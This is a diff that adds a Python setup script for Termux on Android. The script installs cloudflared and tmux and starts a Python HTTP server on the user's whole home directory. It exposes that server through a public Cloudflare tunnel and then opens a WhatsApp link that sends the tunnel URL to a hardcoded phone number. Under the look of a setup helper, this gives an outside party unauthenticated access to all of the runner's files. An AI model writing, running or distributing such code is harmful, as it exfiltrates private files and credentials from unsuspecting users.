@@ -1,0 +1,98 @@
+import os
+import time
+import subprocess
+
+try:
+    # define packages to install
+    pkgs = ["python", "cloudflared", "tmux"]
+    
+    # install each package
+    for pkg in pkgs:
+        print(f"Installing {pkg}...")
+        # Use apt instead of pkg for Termux
+        result = os.system(f"apt install -y {pkg}")
+        if result == 0:
+            print(f"{pkg} is successfully installed")
+        else:
+            print(f"Failed to install {pkg}")
+        time.sleep(2)  # Reduced from 10 minutes to 2 seconds
+    
+    # Start cloudflared tunnel in background
+    print("Starting cloudflared tunnel...")
+    
+    # Create a script file for cloudflared
+    with open("start_tunnel.sh", "w") as f:
+        f.write('''#!/data/data/com.termux/files/usr/bin/bash
+cloudflared tunnel --url http://localhost:8080 > tunnel.log 2>&1 &
+echo $! > tunnel.pid
+''')
+    
+    # Make it executable and run
+    os.system("chmod +x start_tunnel.sh")
+    os.system("./start_tunnel.sh")
+    time.sleep(5)  # Give it time to start
+    
+    # Check if tunnel started and get URL
+    if os.path.exists("tunnel.log"):
+        os.system("sleep 3")
+        # Try to extract URL from logs
+        os.system('grep -o "https://[^ ]*\\.trycloudflare\\.com" tunnel.log | head -1 > ge.txt')
+    
+    print("cloudflared has started.......")
+    
+    # Start tmux session for HTTP server
+    print("Starting tmux session with Python server...")
+    
+    # Create a script to run in tmux
+    with open("run_server.sh", "w") as f:
+        f.write('''#!/data/data/com.termux/files/usr/bin/bash
+cd $HOME
+python -m http.server 8080
+''')
+    
+    os.system("chmod +x run_server.sh")
+    
+    # Start tmux session with the server
+    os.system("tmux new-session -d -s myserver './run_server.sh'")
+    
+    print("Python HTTP server is running on port 8080...")
+    
+    # Try to send WhatsApp message if ge.txt exists
+    time.sleep(3)
+    if os.path.exists("ge.txt"):
+        with open("ge.txt", "r") as f:
+            tunnel_url = f.read().strip()
+        
+        if tunnel_url:
+            # Create WhatsApp URL - fixed syntax
+            whatsapp_url = f"https://api.whatsapp.com/send?phone=+256768418400&text={tunnel_url}"
+            
+            # Try to open in browser - simplified approach
+            print(f"Tunnel URL: {tunnel_url}")
+            print(f"WhatsApp URL: {whatsapp_url}")
+            
+            # For Termux, we can use termux-open-url
+            os.system(f'termux-open-url "{whatsapp_url}" 2>/dev/null || echo "Could not open URL automatically"')
+    
+    print("\n=== Setup Complete ===")
+    print("1. Cloudflared tunnel is running")
+    print("2. Python HTTP server is running on port 8080")
+    print("3. Check 'tunnel.log' for cloudflared output")
+    print("4. Check 'ge.txt' for your tunnel URL")
+    print("5. Access server at: http://localhost:8080")
+    print("6. Access via tunnel at the URL in ge.txt")
+    
+    # Keep script running
+    print("\nPress Ctrl+C to exit...")
+    while True:
+        time.sleep(1)
+
+except Exception as e:
+    print(f"\nError occurred: {e}")
+    print("\nTry these steps first:")
+    print("1. Update Termux: apt update && apt upgrade -y")
+    print("2. Install requirements: pkg install python cloudflared tmux -y")
+    print("3. Run the script again")
+    print("\nIf cloudflared fails, you may need to:")
+    print("- Run: cloudflared tunnel login")
+    print("- Then run: cloudflared tunnel --url http://localhost:8080")
